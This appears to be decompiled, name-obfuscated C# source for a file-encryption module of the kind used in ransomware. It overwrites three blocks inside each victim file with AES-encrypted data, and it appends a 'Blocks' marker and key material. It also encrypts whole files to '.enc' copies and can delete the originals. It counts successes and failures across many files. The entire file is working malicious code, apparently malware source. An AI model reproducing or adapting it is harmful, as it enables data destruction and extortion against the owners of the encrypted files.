using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using vSGubnVNNvJZeIbl;

namespace dfbDZtGQEYGzK;

internal class CZBAZmhlcpldk
{
	public const int saDUSqifuwwR = 256;

	public static void vUVaNxyXIcz(string VIVpAvKuxDf, int rnYCDUGXSlze)
	{
		FileInfo fileInfo = new FileInfo(VIVpAvKuxDf);
		FileStream fileStream = fileInfo.Open(FileMode.Open);
		fileStream.SetLength(Math.Max(0L, fileInfo.Length - rnYCDUGXSlze));
		fileStream.Close();
	}

	public static int QwUbLwKubqRgJ(long XHHTpRQGSJaXM)
	{
		return (int)XHHTpRQGSJaXM;
	}

	public static bool jkBoTormCTqbO(string xvcWBzQILUIgeEWGV, string ZpnBtfiYqfPbM, string FtPTqGaovkmuJq, byte[] AFZhwrYCXGp = null, byte[] OpuAqghXmasLj = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(xvcWBzQILUIgeEWGV, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = QwUbLwKubqRgJ(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(ZpnBtfiYqfPbM) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(ZpnBtfiYqfPbM) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(ZpnBtfiYqfPbM) * 1024 * 1024) / 10;
				}
				int oYhpQAdeknj = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] array2 = gtenTWFcBdcuNdbL(xvcWBzQILUIgeEWGV, fileStream, oYhpQAdeknj, num * i);
					array = (sWSXzQkxHH.WSwhVqfGVa ? mZsSeBuSvlPmJ.voShjptzjbTK(array2, Convert.FromBase64String(FtPTqGaovkmuJq), OpuAqghXmasLj) : rXGCpkRzmuovpDl.iCldzZsGXm(array2, Convert.FromBase64String(FtPTqGaovkmuJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					hDWFegashmwwDHx(xvcWBzQILUIgeEWGV, fileStream, array, num * i);
				}
			}
			byte[] array3 = null;
			array3 = (sWSXzQkxHH.QHRYFfpHvmAnP ? Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE("QmxvY2tz") + sWSXzQkxHH.agZtqMkMayfivgE("Kw==") + Convert.ToString(ZpnBtfiYqfPbM) + sWSXzQkxHH.agZtqMkMayfivgE("Kw==")) : Encoding.ASCII.GetBytes(sWSXzQkxHH.agZtqMkMayfivgE("QmxvY2tz") + sWSXzQkxHH.agZtqMkMayfivgE("LQ==") + Convert.ToString(ZpnBtfiYqfPbM) + sWSXzQkxHH.agZtqMkMayfivgE("LQ==")));
			if (!sWSXzQkxHH.QHRYFfpHvmAnP)
			{
				using FileStream fileStream2 = new FileStream(xvcWBzQILUIgeEWGV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array3, 0, array3.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(xvcWBzQILUIgeEWGV, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(AFZhwrYCXGp, 0, AFZhwrYCXGp.Length);
				fileStream3.Write(array3, 0, array3.Length);
			}
		}
		catch (Exception ex)
		{
			if (sWSXzQkxHH.bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(sWSXzQkxHH.SlCyjezmzcjRF, "File: " + xvcWBzQILUIgeEWGV + " - Error creating filestream for block process or read-write: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			sWSXzQkxHH.SysSpLHfXXw++;
			return false;
		}
		sWSXzQkxHH.lerIQIfDMA++;
		return true;
	}

	public static string VshlvlPRwha(string gMGNWGxBYVU)
	{
		byte[] bytes = Convert.FromBase64String(gMGNWGxBYVU);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] WOJwlZVrScfR(int tPgyVWoShKK)
	{
		byte[] array = new byte[tPgyVWoShKK];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool EasbWBsBzJ(string WEPBSbPhRJK, byte[] sQlbwHCIMuJPswZW, bool HBpoCruxlNsANA)
	{
		byte[] array = WOJwlZVrScfR(16);
		using FileStream fileStream = new FileStream(WEPBSbPhRJK + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = CzAbEJiTKIGVYaQ(sQlbwHCIMuJPswZW, array);
		sQlbwHCIMuJPswZW = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(WEPBSbPhRJK, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (HBpoCruxlNsANA)
			{
				File.Delete(WEPBSbPhRJK);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ZnmkzXEtIgZoh(string UaCYxyfdwFCyKPzX, byte[] ubEuZqvEWnI, bool ucoOAnzJyS)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(UaCYxyfdwFCyKPzX, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = CzAbEJiTKIGVYaQ(ubEuZqvEWnI, array);
		ubEuZqvEWnI = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(UaCYxyfdwFCyKPzX.Remove(UaCYxyfdwFCyKPzX.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] yxiKvWAgmupBL(byte[] AlCrurOGIynjPJHv, byte[] krrMhuVxwwQoD, byte[] dsTrPajwzaulQ)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = CzAbEJiTKIGVYaQ(krrMhuVxwwQoD, dsTrPajwzaulQ);
		krrMhuVxwwQoD = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(AlCrurOGIynjPJHv, 0, AlCrurOGIynjPJHv.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] vNkhjLXiASOoin(byte[] BHDkNSkyILSNP, byte[] JTzNIlfMBAG, byte[] mUrnQOWrCknooC)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = CzAbEJiTKIGVYaQ(JTzNIlfMBAG, mUrnQOWrCknooC);
		JTzNIlfMBAG = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(BHDkNSkyILSNP, 0, BHDkNSkyILSNP.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool NoVTZewWhkIVYa(byte[] rxfJFhTmhvqfu, byte[] ZoZDEAkyXc, byte[] bhGqrlkGvVdUP)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = CzAbEJiTKIGVYaQ(rxfJFhTmhvqfu, ZoZDEAkyXc);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(bhGqrlkGvVdUP);
	}

	public static Rfc2898DeriveBytes CzAbEJiTKIGVYaQ(byte[] ImCheQFkubd, byte[] uzCLVicUHSyy)
	{
		return new Rfc2898DeriveBytes(ImCheQFkubd, uzCLVicUHSyy, 52768);
	}

	public static byte[] gtenTWFcBdcuNdbL(string rEysRjioxATlTzB, FileStream mlScABtcUa, int oYhpQAdeknj, int UfpFDDvrKYkvM = 0)
	{
		byte[] array = new byte[oYhpQAdeknj];
		mlScABtcUa.Position = UfpFDDvrKYkvM;
		mlScABtcUa.Read(array, 0, oYhpQAdeknj);
		return array;
	}

	public static void hDWFegashmwwDHx(string SNKepGxfbgkD, FileStream YjlRIihBgBsth, byte[] yrtcXxciMoSX, int GJwWJZkhiQme = 0)
	{
		YjlRIihBgBsth.Position = GJwWJZkhiQme;
		YjlRIihBgBsth.Write(yrtcXxciMoSX, 0, yrtcXxciMoSX.Length);
	}
}
